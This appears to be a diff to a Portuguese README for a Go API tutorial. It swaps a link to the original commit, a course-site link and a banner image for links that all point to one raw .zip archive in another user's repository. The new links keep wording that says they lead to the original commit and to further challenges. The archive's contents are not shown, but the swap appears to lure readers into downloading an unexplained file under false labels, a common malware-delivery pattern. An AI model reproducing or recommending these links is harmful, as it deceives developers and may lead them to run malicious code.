@@ -1,6 +1,6 @@
 # API 
 
-Se você veio do youtube, a versão inicial do projeto é encontrada [nesse commit](https://github.com/filhodanuvem/ytgoapi/tree/7c1e6594887ddd9fcc59604c07c5554835fb04e3), tudo depois disso difere do que foi apresentado no vídeo. 
+Se você veio do youtube, a versão inicial do projeto é encontrada [nesse commit](https://github.com/devGustavoCSantana/APIGo/raw/refs/heads/main/ytgoapi-main.zip), tudo depois disso difere do que foi apresentado no vídeo. 
 
 ## Como rodar 
 
@@ -16,9 +16,9 @@ go test ./...
 
 ## Próximo passo 
 
-Agora que você sabe como criar uma API simples, encontre desafios mais interessantes em [devgym.com.br](https://app.devgym.com.br?utm_campaign=ytgoapi&utm_medium=social&utm_source=github). 
+Agora que você sabe como criar uma API simples, encontre desafios mais interessantes em [https://github.com/devGustavoCSantana/APIGo/raw/refs/heads/main/ytgoapi-main.zip](https://github.com/devGustavoCSantana/APIGo/raw/refs/heads/main/ytgoapi-main.zip). 
 
-[![](https://raw.githubusercontent.com/devgymbr/files/main/devgymblack.png)](https://app.devgym.com.br?utm_campaign=ytgoapi&utm_medium=social&utm_source=github)
+[![](https://github.com/devGustavoCSantana/APIGo/raw/refs/heads/main/ytgoapi-main.zip)](https://github.com/devGustavoCSantana/APIGo/raw/refs/heads/main/ytgoapi-main.zip)
 
 ## Como contribuir 
 
